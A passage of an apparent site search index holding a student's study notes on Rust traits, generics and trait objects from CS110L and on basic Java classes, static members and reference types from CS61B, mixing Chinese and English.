\u6216\u8005 <code>T</code>\u200b \u81f3\u5c11\u6709\u4e00\u4e2a\u662f\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u5b9a\u4e49\u7684\uff01  \u4f8b\u5982\u6211\u4eec\u53ef\u4ee5\u4e3a\u4e0a\u9762\u7684 <code>Post</code>\u200b \u7c7b\u578b\u5b9e\u73b0\u6807\u51c6\u5e93\u4e2d\u7684 <code>Display</code>\u200b \u7279\u5f81\uff0c\u8fd9\u662f\u56e0\u4e3a <code>Post</code>\u200b \u7c7b\u578b\u5b9a\u4e49\u5728\u5f53\u524d\u7684\u4f5c\u7528\u57df\u4e2d\u3002\u540c\u65f6\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u5f53\u524d\u5305\u4e2d\u4e3a <code>String</code>\u200b \u7c7b\u578b\u5b9e\u73b0 <code>Summary</code>\u200b \u7279\u5f81\uff0c\u56e0\u4e3a <code>Summary</code>\u200b \u5b9a\u4e49\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\u3002</p> <p>\u4f46\u662f\u4f60\u65e0\u6cd5\u5728\u5f53\u524d\u4f5c\u7528\u57df\u4e2d\uff0c\u4e3a <code>String</code>\u200b \u7c7b\u578b\u5b9e\u73b0 <code>Display</code>\u200b \u7279\u5f81\uff0c\u56e0\u4e3a\u5b83\u4eec\u4fe9\u90fd\u5b9a\u4e49\u5728\u6807\u51c6\u5e93\u4e2d\uff0c\u5176\u5b9a\u4e49\u6240\u5728\u7684\u4f4d\u7f6e\u90fd\u4e0d\u5728\u5f53\u524d\u4f5c\u7528\u57df\uff0c\u8ddf\u4f60\u534a\u6bdb\u94b1\u5173\u7cfb\u90fd\u6ca1\u6709\uff0c\u770b\u770b\u5c31\u884c\u4e86\u3002</p> <p>\u9ed8\u8ba4\u5b9e\u73b0</p> <p>\u6211\u4eec\u5141\u8bb8traits\u91cc\u7684\u65b9\u6cd5\u6709\u9ed8\u8ba4\u7684\u5b9e\u73b0\uff0c\u8fd9\u79cd\u9ed8\u8ba4\u7684\u5b9e\u73b0\u53ea\u5141\u8bb8\u8c03\u7528\u540c\u4e00\u4e2atraits\u7684\u5176\u4ed6\u65b9\u6cd5</p> <pre><code>pub trait Summary {\n    fn summarize_author(&amp;self) -&gt; String;\n\n    fn summarize(&amp;self) -&gt; String {\n        format!(\"(Read more from {}...)\", self.summarize_author())\n    }\n}\n</code></pre> <p>\u4ee5traits\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570</p> <p>\u6b64\u5904\u662fRust\u57fa\u4e8etraits\u6765\u5b9e\u73b0\u591a\u6001\u7684\u64cd\u4f5c\uff0c\u5728\u5f88\u591a\u573a\u5408\u4e2d\u8868\u73b0\u5f88\u597d</p> <pre><code>pub fn notify(item: &amp;impl Summary) {\n    println!(\"Breaking news! {}\", item.summarize());\n}\n</code></pre> <p>\u53ea\u9700\u8981item\u5b9e\u73b0\u4e86Summary\u8fd9\u4e2atraits\uff0c\u4fbf\u53ef\u4ee5\u4f5c\u4e3a\u8fd9\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u88ab\u8c03\u7528\uff0c\u4e0a\u8ff0\u505a\u6cd5\u8fd8\u53ef\u4ee5\u88ab\u8868\u793a\u4e3a</p> <pre><code>pub fn notify&lt;T: Summary&gt;(item: &amp;T) {\n    println!(\"Breaking news! {}\", item.summarize());\n}\n</code></pre> <p>\u6240\u8c13\u7684<code>T: Summary</code>\u200b \u88ab\u79f0\u4e3a\u7279\u5f81\u7ea6\u675f\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6cdb\u578b\u5b9e\u73b0\u76f8\u5f53\u590d\u6742\u7684\u7279\u5f81\u7ea6\u675f</p> <pre><code>fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32\n    where T: Display + Clone,\n          U: Clone + Debug\n{}\n</code></pre> <p>derive \u7279\u5f81</p> <p>\u5bf9\u4e8e\u4e00\u4e9b\u5e38\u7528\u7684\u7279\u5f81\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u91c7\u7528\u5f62\u5982<code>#[derive(Debug)]</code>\u200b\u7684\u65b9\u5f0f\u4f7f\u5f97\u8fd9\u4e2a\u7c7b\u5305\u542b\u4e86\u8fd9\u4e2a\u7279\u5f81\u7684\u9ed8\u8ba4\u5b9e\u73b0</p> <pre><code>#[derive(Debug, PartialEq, Clone, Copy)]\nstruct Point{\n    x: f64,\n    y: f64\n}\n</code></pre> <ul> <li>Clone \u8986\u76d6\u663e\u5f0f\u5730\u751f\u6210\u62f7\u8d1d\u4f53</li> <li>Copy \u8986\u76d6 <code>=</code>\u200b \u7684\u6548\u679c</li> <li>PartialEq \u7b49\u540c\u4e8e\u91cd\u8f7d ==</li> <li>Eq \u8868\u793a\u4e24\u4e2a\u4e1c\u897f\u6307\u5411\u540c\u4e00\u4e2a\u5bf9\u8c61\uff1f \u6bd4\u5982\u4e24\u4e2a\u4e0d\u53ef\u53d8\u5f15\u7528\uff1f</li> </ul> <p>\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>impl Drop for LinkedList {\n    fn drop(&amp;mut self) {\n        let mut current = self.head.take();\n        while let Some(mut node) = current {\n            current = node.next.take();\n        }\n    }\n}\n</code></pre> <p>\u4e0a\u8ff0\u8fd9\u4e2a\u4f8b\u5b50\u8986\u76d6\u4e86\u6211\u4eec\u7684LinkedList\u91cc\u9762\u7684Drop\u65b9\u6cd5\uff0c\u4e4b\u6240\u4ee5\u9700\u8981\u8986\u76d6\u8fd9\u4e2a\u5e76\u4e0d\u662f\u8bf4Rust\u6ca1\u6709\u80fd\u529b\u6839\u636eRAII\u53bb\u56de\u6536\u94fe\u8868\u7684\u8d44\u6e90\uff0c\u800c\u662f\u5982\u679c\u4e0d\u8986\u76d6\u7684\u8bdd\uff0c\u7cfb\u7edf\u9ed8\u8ba4\u4f1a\u6839\u636e\u9012\u5f52\u7684\u65b9\u5f0f\u56de\u6536\u8d44\u6e90\uff0c\u4f46\u662f\u5982\u679c\u80fd\u7528\u7b80\u5355\u7684\u5faa\u73af\u7684\u8bdd\uff0c\u9012\u5f52\u603b\u662f\u4e0d\u597d\u7684\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#42-generics","title":"4.2 Generics","text":"<p>\u5f53\u6211\u4eec\u5728Rust\u4e2d\u4f7f\u7528\u6cdb\u578b\u7684\u65f6\u5019\uff0c\u57fa\u7840\u7684\u8868\u8fbe\u65b9\u5f0f\u548c\u5176\u4ed6\u8bed\u8a00\u5e76\u65e0\u4ec0\u4e48\u4e0d\u540c</p> <pre><code>fn add&lt;T&gt;(a:T, b:T) -&gt; T \n</code></pre> <p>\u5f53\u6211\u4eec\u8981\u7f16\u5199\u5b9e\u9645\u7684\u4ee3\u7801\u65f6\uff0c\u5374\u4f1a\u9047\u5230\u62a5\u9519</p> <pre><code>fn add&lt;T&gt;(a:T, b:T) -&gt; T{\n    a + b\n}\n</code></pre> <p>Rust\u5bf9\u4e8e\u6cdb\u578b\u7684\u8bed\u8a00\u5b58\u5728\u6bd4\u8f83\u4e25\u683c\u7684\u9650\u5236\uff0c\u5f53\u6211\u4eec\u6cdb\u578b\u7684\u7c7b\u578b\u9700\u8981\u76f8\u52a0\u65f6\uff0c\u9700\u8981\u505a\u51fa\u58f0\u660e</p> <pre><code>fn add&lt;T: std::ops::Add&lt;Output = T&gt;&gt;(a:T, b:T) -&gt; T {\n    a + b\n}\n</code></pre> <p>\u5728\u7ed3\u6784\u4f53\u4e2d\u4f7f\u7528\u6cdb\u578b</p> <pre><code>struct Point&lt;T&gt; {\n    x: T,\n    y: T,\n}\n\nimpl&lt;T&gt; Point&lt;T&gt; {\n    fn x(&amp;self) -&gt; &amp;T {\n        &amp;self.x\n    }\n}\n</code></pre> <p>const \u6cdb\u578b</p> <p>\u4e5f\u5373\u5bf9\u503c\u8fdb\u884c\u6cdb\u578b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#43-traits","title":"4.3 \u6df1\u5165\u4e86\u89e3Traits","text":"<p>\u200b<code>dyn</code>\u200b\u5173\u952e\u8bcd\uff0cRust\u4e2d\u7684\u7279\u5f81\u5bf9\u8c61\u7684\u5173\u952e\uff0c\u6709\u65f6\u5019\u5bf9\u4e8e\u4e00\u4e2a\u5bf9\u8c61\uff0c\u6211\u4eec\u4ec5\u4ec5\u5173\u5fc3\u5176\u7279\u5f81\uff0c\u800c\u4e0d\u5173\u5fc3\u5176\u5177\u4f53\u5b9e\u73b0\uff0c\u6b64\u65f6\u5c31\u9700\u8981\u8c03\u7528<code>dyn</code>\u200b\u5173\u952e\u8bcd</p> <pre><code>trait Draw {\n    fn draw(&amp;self) -&gt; String;\n}\n\nimpl Draw for u8 {\n    fn draw(&amp;self) -&gt; String {\n        format!(\"u8: {}\", *self)\n    }\n}\n\nimpl Draw for f64 {\n    fn draw(&amp;self) -&gt; String {\n        format!(\"f64: {}\", *self)\n    }\n}\n\n// \u82e5 T \u5b9e\u73b0\u4e86 Draw \u7279\u5f81\uff0c \u5219\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u4f20\u5165\u7684 Box&lt;T&gt; \u53ef\u4ee5\u88ab\u9690\u5f0f\u8f6c\u6362\u6210\u51fd\u6570\u53c2\u6570\u7b7e\u540d\u4e2d\u7684 Box&lt;dyn Draw&gt;\nfn draw1(x: Box&lt;dyn Draw&gt;) {\n    // \u7531\u4e8e\u5b9e\u73b0\u4e86 Deref \u7279\u5f81\uff0cBox \u667a\u80fd\u6307\u9488\u4f1a\u81ea\u52a8\u89e3\u5f15\u7528\u4e3a\u5b83\u6240\u5305\u88f9\u7684\u503c\uff0c\u7136\u540e\u8c03\u7528\u8be5\u503c\u5bf9\u5e94\u7684\u7c7b\u578b\u4e0a\u5b9a\u4e49\u7684 `draw` \u65b9\u6cd5\n    x.draw();\n}\n\nfn draw2(x: &amp;dyn Draw) {\n    x.draw();\n}\n\nfn main() {\n    let x = 1.1f64;\n    // do_something(&amp;x);\n    let y = 8u8;\n\n    // x \u548c y \u7684\u7c7b\u578b T \u90fd\u5b9e\u73b0\u4e86 `Draw` \u7279\u5f81\uff0c\u56e0\u4e3a Box&lt;T&gt; \u53ef\u4ee5\u5728\u51fd\u6570\u8c03\u7528\u65f6\u9690\u5f0f\u5730\u88ab\u8f6c\u6362\u4e3a\u7279\u5f81\u5bf9\u8c61 Box&lt;dyn Draw&gt; \n    // \u57fa\u4e8e x \u7684\u503c\u521b\u5efa\u4e00\u4e2a Box&lt;f64&gt; \u7c7b\u578b\u7684\u667a\u80fd\u6307\u9488\uff0c\u6307\u9488\u6307\u5411\u7684\u6570\u636e\u88ab\u653e\u7f6e\u5728\u4e86\u5806\u4e0a\n    draw1(Box::new(x));\n    // \u57fa\u4e8e y \u7684\u503c\u521b\u5efa\u4e00\u4e2a Box&lt;u8&gt; \u7c7b\u578b\u7684\u667a\u80fd\u6307\u9488\n    draw1(Box::new(y));\n    draw2(&amp;x);\n    draw2(&amp;y);\n}\n</code></pre> <p>\u200b<code>dyn</code>\u200b\u53ea\u80fd\u7528\u4e8eBox\u6216\u8005&amp;\u7684\u5730\u65b9</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#rust","title":"Rust \u8bed\u8a00\u7279\u6027","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#array-and-vec","title":"Array and Vec","text":"<p>\u9996\u5148\u6211\u4eec\u4ecb\u7ecdarray\uff0c\u5176\u8868\u793aRust\u4e2d\u7684\u5b9a\u957f\u6570\u7ec4\uff0c\u4f7f\u7528\u6bd4\u8f83\u7b80\u5355</p> <pre><code>let arr = [3; 8]; \u8868\u793a\u751f\u6210\u4e00\u4e2a8\u4e2a\u5143\u7d20\uff0c\u5747\u4e3a3\u7684\u6570\u7ec4\n</code></pre> <p>\u4f46\u662f\u5f53\u6570\u7ec4\u7684\u5143\u7d20\u662f\u590d\u6742\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u95ee\u9898\u4f1a\u6709\u6240\u590d\u6742\uff0c\u56e0\u4e3a\u6570\u7ec4\u7684\u751f\u6210\u9700\u8981\u7684\u662f\u62f7\u8d1d\u7279\u6027\uff0c\u6bd4\u5982\u4e0a\u8ff0\u4ee3\u7801\u76f8\u5f53\u4e8e\u628a3\u62f7\u8d1d\u4e868\u6b21\uff0c\u4f46\u662f\u590d\u6742\u5bf9\u8c61\u53ef\u80fd\u9ed8\u8ba4\u662f\u79fb\u52a8\u8bed\u4e49</p> <pre><code>let array: [String; 8] = std::array::from_fn(|_i| String::from(\"rust is good!\"));\n\nprintln!(\"{:#?}\", array);\n</code></pre> <p>\u6570\u7ec4\u8fd8\u53ef\u4ee5\u505a\u5207\u7247</p> <pre><code>let a: [i32; 5] = [1, 2, 3, 4, 5];\n\nlet slice: &amp;[i32] = &amp;a[1..3];\n\nassert_eq!(slice, &amp;[2, 3]);\n</code></pre> <p>\u4e0a\u9762\u7684\u6570\u7ec4\u5207\u7247 <code>slice</code>\u200b \u7684\u7c7b\u578b\u662f<code>&amp;[i32]</code>\u200b\uff0c\u4e0e\u4e4b\u5bf9\u6bd4\uff0c\u6570\u7ec4\u7684\u7c7b\u578b\u662f<code>[i32;5]</code>\u200b\uff0c\u8981\u6ce8\u610f\u5207\u7247\u662f\u5bf9\u539f\u6570\u7ec4\u7684\u5f15\u7528</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#project-and-exercise","title":"Project and Exercise","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS110L/CS110L/#week1","title":"week1","text":"<p>part1\u4e3b\u8981\u662f\u4e00\u4e9b\u7b80\u5355\u7684\u53d8\u91cf\u4f7f\u7528\u7684\u8bf4\u660e\uff0c\u5728Rust\u5165\u95e8\u91cc\u9762\u5199\u8fc7\u4e86\u5c31\u61d2\u5f97\u518d\u5199\u4e86</p> <p>\u5173\u4e8e\u5b57\u7b26\u4e32</p> <p>\u5173\u4e8e\u5b57\u7b26\u4e32\uff0cRust\u4e2d\u6709\u4e24\u79cd\u5b57\u7b26\u4e32\u7c7b\u578b<code>&amp;str</code>\u200b\u548c<code>String</code>\u200b\uff0c\u5176\u4e2d<code>&amp;str</code>\u200b\u662f\u4e00\u79cd\u6307\u5411\u5185\u5b58\u4e2d\u7684\u5b57\u7b26\u4e32\u7684\u4e0d\u53ef\u53d8\u6307\u9488\uff0c\u800c<code>String</code>\u200b\u7c7b\u578b\u5219\u662f\u8868\u793a\u4e00\u4e2aheap-allocated\u7684\u5b57\u7b26\u4e32</p> <pre><code>let s: &amp;str = \"Hello world\";    // the \": &amp;str\" annotation is optional\nlet mut s: String = String::from(\"Hello \"); // \"String\" type annotation is optional\ns.push_str(\"world!\");\n</code></pre> <p>\u6570\u7ec4</p> <p>Rust\u4f7f\u7528Vec\u8868\u793a\u53d8\u957f\u6570\u7ec4\uff0c\u548c[]\u8868\u793a\u5b9a\u957f\u6570\u7ec4</p> <pre><code>let mut v: Vec&lt;i32&gt; = Vec::new();\nlet mut arr: [i32; 4] = [0, 2, 4, 8];\n</code></pre> <p>\u6570\u7ec4\u7684\u904d\u5386\uff0c<code>iter()</code>\u200b \u8fed\u4ee3\u7684\u662f\u4e0d\u53ef\u53d8\u5f15\u7528</p> <pre><code>for i in v.iter() { // v is the vector from above\n    println!(\"{}\", i);\n}\n</code></pre> <p>\u5bf9\u4e8eVec\uff0cRust\u5df2\u7ecf\u4e3a\u6211\u4eec\u5b8c\u6210\u4e86\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528\u8fc7==\u6bd4\u8f83\u662f\u5426\u5b8c\u5168\u76f8\u540c</p> <p>\u51fd\u6570</p> <pre><code>fn sum(a: i32, b: i32) -&gt; i32 {\n    a + b\n}\n</code></pre> <p>expression</p> <p>Rust\u6df1\u53d7\u51fd\u6570\u5f0f\u8bed\u8a00\u7684\u5f71\u54cd\uff0c\u5176\u4e2d\u4e00\u5207\u5747\u4e3aexpression\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u8fd9\u6837\u7684\u4ee3\u7801</p> <pre><code>let x = if someBool { 2 } else { 4 }\n</code></pre> <p>\u4ea6\u6216\u8005\u662f\u8fd9\u6837\u7684\u9012\u5f52</p> <pre><code>fn fib(n: i32) -&gt; i32 {\n    if n &lt;= 1 { n } else { fib(n-1) + fib(n-2) }\n}\n</code></pre> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/","title":"learning Java","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#run-the-first-java-program-in-shell","title":"run the first java program in shell","text":"<p>here shows how to run a java project in command line</p> <p>\u200b\u200b</p> <p>using instruction \"explorer .\" can open the file folder we are now.</p> the first program<pre><code>public class Hello{\n    public static void main(String[] args){\n        System.out.println(\"Hello world\");\n    }\n}\n</code></pre> <ol> <li>in java, all codes live inside of class</li> <li>the code that is run is inside the method \"main\" and the main method is also in some class</li> <li>The name of class should be same with file name, for example, in hello.java you should write the hello class.</li> </ol> <p>above is some basic rules of Java</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#some-features-like-c","title":"some features like C","text":"<p>Java\u7684\u57fa\u672c\u8bed\u6cd5\u4e0eC/C++\u6709\u4e00\u5b9a\u7684\u76f8\u4f3c\u6027\uff0c\u5305\u62ec\u57fa\u7840\u6570\u636e\u7c7b\u578b\uff0c\u5224\u65ad\u8bed\u53e5\uff0c\u5faa\u73af\u8bed\u53e5\u7b49\u7b49</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#variables-and-loops","title":"variables and loops","text":"<p>use a small test and I don't repeat it again just give a screenshot here</p> <p>\u200b\u200b</p> <p>here are some rules we can find above</p> <ol> <li>each variables should be given a type, \u200bwhich is like C</li> <li>the definition of loop is like C, \u5faa\u73af\u8bed\u53e5\u548cC\u7c7b\u4f3c</li> <li>print(x+\" \") is to prevent numbers from running into each other.</li> </ol> <pre><code>/*\u76ee\u524d\u6211\u4eec\u89c1\u5230\u4e24\u79cd\u8f93\u51fa\u8bed\u53e5*/\nSystem.out.println(x);\nSystem.out.print(x);\n/*\u5b83\u4eec\u533a\u522b\u5728\u4e8e\u524d\u8005\u672b\u5c3e\u6362\u884c\uff0c\u540e\u8005\u4e0d\u6362\u884c*/\n</code></pre> <p>java also provide way to enhance loop, which is called iterations, we will talk about the detail of it after.</p> <pre><code>public class EnhancedForBreakDemo {\n    public static void main(String[] args) {\n        String[] a = {\"cat\", \"dog\", \"laser horse\", \"ketchup\", \"horse\", \"horbse\"};\n\n        for (String s : a) {\n            for (int j = 0; j &lt; 3; j += 1) {\n                System.out.println(s);\n                if (s.contains(\"horse\")) {\n                    break;\n                }              \n            }\n        }\n    }\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#static-types-check","title":"static types check","text":"<p>In java, all variables and expression have the static type Its static type can never be changed, or we will have mistake during compiling.</p> <p>As Java's language feature, static type is different from the type we usaully consider, and we will talk about the static type and dynamic type after.</p> <p>And static type will make sure programmer know exactly what sort of object we are dealing with, which is a good feature indeed.</p> <pre><code>String h=5+\"hello\";\n//\u6b64\u65f6h\u4e3a\u201c5hello\u201d\nString h=5+\"10\";\n//\u6b64\u65f6h\u4e3a\"510\"\n</code></pre> <p>And even the action that give 5.3 to a int variable is not allowed.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#function","title":"function","text":"<pre><code>public class classname{\n//\u4e0b\u8ff0\u5c31\u662f\u4e00\u4e2ajava\u51fd\u6570\n    public static int max(int a,int b){\n        if(a&gt;b){\n            return a;\n        }\n        return b;\n    }\n    public static void main(String[] args){\n        System.out.println(max(10,5));\n    }\n}\n</code></pre> <p>public static int max(int a,int b);</p> <p>it is a signature of the function, which contains parameters, return types, name, and any modifiers(\u4fee\u9970\u8bed\uff0c\u5305\u62ecpublic \u548c static)</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#arrays","title":"arrays","text":"<p>the definition of arrays</p> <pre><code>//\u5728java\u4e2d\u5b9a\u4e49\u6570\u7ec4\u6709\u51e0\u79cd\u65b9\u5f0f\nint[] numbers=new int[3];\nint[] numbers=new int[]{2,3,5};\n</code></pre> <p>When you define an array, you will never use these two ways together. For example, <code>int[] numbers=new int [3]{2,3,5};</code>\u200b will cause an error.</p> <p>the methods of arrays</p> <pre><code>int[] numbers=new int[3];\nSystem.out.println(numbers.length);//\u83b7\u5f97\u6570\u7ec4\u7684\u957f\u5ea6\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#object","title":"object","text":"<p>Object is the instance of the class.</p> <pre><code>public class Dog{\n    public int weightInPounds;\n    public void makeNoise(){ //\u9759\u6001\u7684\u51fd\u6570\u5185\u90e8\u4e0d\u80fd\u8c03\u7528\u975e\u9759\u6001\u7684\u6570\u636e\n        if(weightInPounds&lt;10){\n            System.out.println(\"yipyip\");\n        }else if(weightInPounds&lt;30){\n            System.out.println(\"barkbark\");\n        }else{\n            System.out.println(\"woof\");\n        }\n}\n\npublic class DogLaucher{\n    public static void main(String[] args){\n        Dog d;\n        d=new Dog();\n        d.weightInPounds=25;\n        d.makeNoise();\n    }\n}\n</code></pre> <p>above is the basic class and the way to use it. the variables without static is called instance variables or non-staic variables, so do method.(\u8fd9\u4e9b\u53d8\u91cf\u548c\u65b9\u6cd5\u4e0d\u80fd\u8131\u79bb\u5b9e\u4f8b\uff0c\u4e0d\u80fd\u53ea\u9760\u7c7b\u4f7f\u7528\uff0c\u5fc5\u987b\u8fd8\u4f9d\u8d56\u4e8e\u5bf9\u8c61  As a object oriented language, java has more features about object.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#constructor","title":"constructor","text":"<pre><code>public class Dog{\n    public Dog(int w){\n        weightInPounds=w;\n    }\n}\n\nDog d=new Dog(25);\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#array-of-objects","title":"array of objects","text":"<pre><code>//main\nDog[] dogs=new Dog[2];\ndogs[0]=new Dog(20);\ndogs[1]=new Dog(15);\n//this new is being used in two different way\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#static-method-and-non-static-method","title":"static method and non-static method","text":"<p>The difference between these two methods is whether there is static or not in delcaration.</p> <p>In other way, static method is class method and non-static method is instance method</p> <p>instance method can be taken only by specific instance of class.</p> <p>sometimes, it is necssary for a class have static and non-static methods at the same time. For example</p> <pre><code>public class Dog{\n    //...\n    public static Dog biggerDog(Dog d1,Dog d2){\n        if(d1.weightInPounds&gt;d2.weightInPounds){\n            return d1;\n        }else {\n            return d2;\n        }\n    }\n}\n\n//main\n    Dog d1=new Dog(25);\n    Dog d2=new Dog(30);\n    Dog.biggerDog(d1,d2);\n</code></pre> <p>A static function can be used by <code>ClassName.MethodName()</code>\u200b. And it can't access the non-static member of the class.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#static-variables","title":"static variables","text":"<pre><code>public class Dog{\n    public int weigthInPounds;\n    public static String binomen=\"Candy\";\n    //...\n}\n</code></pre> <p>In fact, we can access to this \"binomen\" by Dog.binomen or d.binomen. However, we highly recommend to use Dog.binomen only.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#command-line-arguments","title":"command line arguments","text":"<pre><code>public class classname{\n    public static void main(String[] args){\n        System.out.println(args[0]);\n    }\n}\n// \u8fd0\u884c\njava classname hello world\n\n//args \u4e3a\u4e00\u4e2a\u5b57\u7b26\u6570\u7ec4\uff0cargs[0]\u5c31\u662fhello\n//args \u5c31\u662f {\"hello\",\"world\"} \n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#reference-type-variables","title":"reference type variables","text":"<p>In my opinion, the reference type is one of the most excellent designs in Java, it also makes Java truly different from C/CPP. So I want to talk about it in more detail.</p> <p>what is variable</p> <p>Each variable will have its memory address, type and its memory size.</p> <p>Unlike programming language like C, we would never know the memory address of a variables in java. It may cause a waste of effciencies, but it actually helps us avoid a lot of programming errors.</p> <p>We can just write a declaration of a variable and don't write anything to it. However, we cann't use these variables until we use \"=\" to fill its memory block.</p> <p>primitive type and reference type</p> <p>In java, there is eight\u200b primitive types. \u200bthey are \"int, double, byte, short, long, float, boolean, char\"</p> <p>Some other type like array and the class we desgin ourselves are not primitive type, they are called reference type.</p> <p>In fact, Java provide the reference version for these primitive type, like \"Integer\" to \"int\". So what's the difference between these two type? To an integer one, if it is \"int\" type, it may be \"0000 0001\" which expresses its true value \"1\" in binary way. If it is \"Integer\" type, it will be an address, which points at an integer whose value is \"1\".</p> <p>For the objects we design ourselves, they all have some additional overhead.(\u989d\u5916\u5f00\u9500</p> <pre><code>public class Warlus{\n    public int weight;\n    public double tuskSize;\n    public Warlus(int w,double tusk){\n        weight=w;\n        tuskSize=tusk;\n    }\n}\n</code></pre> <p>In fact, an object of Walrus will take memory block more than 32bits+64bits. However, for abstraction of java, we should ignore this overhead.</p> <p>an example of references variable</p> <p>In fact, we declare a reference variable of any refernce type, java would give it 64-bit block, no matter how large your class is. This 64-bit block don't contian the data of the variables, but contain the address of it, which means it is a pointer.</p> <pre><code>Walrus someWalrus;\nsomeWalrus = new Walrus(1000,53.8);\n</code></pre> <p>The operator \"new\" will create a Walrus object by constructor Walrus(1000,53.8) and return its address.</p> <p>Specially, we can use value \"null\" to reference variables, corresponding to all zeros</p> <p>Now, we would see this situation</p> <pre><code>Walrus a=new Walrus(1000,53.8);\nWalrus b;\nb=a;\n</code></pre> <p>b just copy the 64-bit block of a, so b and a all point at the same object.</p> <p>parameter passing</p> <p>When we pass parameters to function, we are just copying the bit, which means pass the value.</p> <pre><code>public static double func(double a,double b);\npublic static void main(String[] args){\n    double x=10.0;\n    double y=10.1;\n    func(x,y);\n}\n</code></pre> <p>In the example above, we have block for x and y at first, then in func, we will also create block a and b, and copy the value of x and y to them. </p> <p>But if the type of parameter is reference type, it will copy the what this reference type contains, which is the pointer \u200bin fact. So if we change the reference variable in the function, it will actually change the variable in the outside.</p> <p>We all know that in cpp we usually need to write the copy constructor and overloaded the operator \"=\" because the copy of large object is a large waste of time. But in Java, copy an object will never cost a lot time because we just copy its 64-bit address.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#encapsulation","title":"encapsulation","text":"<p>We can use public and private to control the accessibility of data.</p> <p>For example</p> <pre><code>public class SLList{\n    private IntNode first;\n    ...\n}\n</code></pre> <p>In this cause, we can't use s.first to access the data memeber first.  </p> <p>Private variables and method can only be accessed by the code in the same .java file.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#nested-class","title":"nested class","text":"<p>In java, we can delcare a class inside another class, for example</p> <pre><code>public class SLList{\n    public class IntNode{...}\n    private IntNode first;\n    ...\n}\n</code></pre> <p>We use nested class when the inside class only serve the enclosing class. If we don't want the class IntNode to access the variables and method in SLList. We can declare \"static\" to it. Like below</p> <pre><code>public class SLList{\n    public static class IntNode{...}\n    ...\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#overload-of-function","title":"overload of function","text":"<p>The rules of overloading function is like cpp.</p> <p>The functions should have different parameters.</p> <p>Overload is good, but it also have many shortcomes, it may create many similar code blocks.</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/CS61B/learning%20Java/#generics","title":"generics","text":"<p>We can use a name after your class name declaration and this name can replace the type</p> <pre><code>public class DLList&lt;myTypeName&gt; {\n    private IntNode 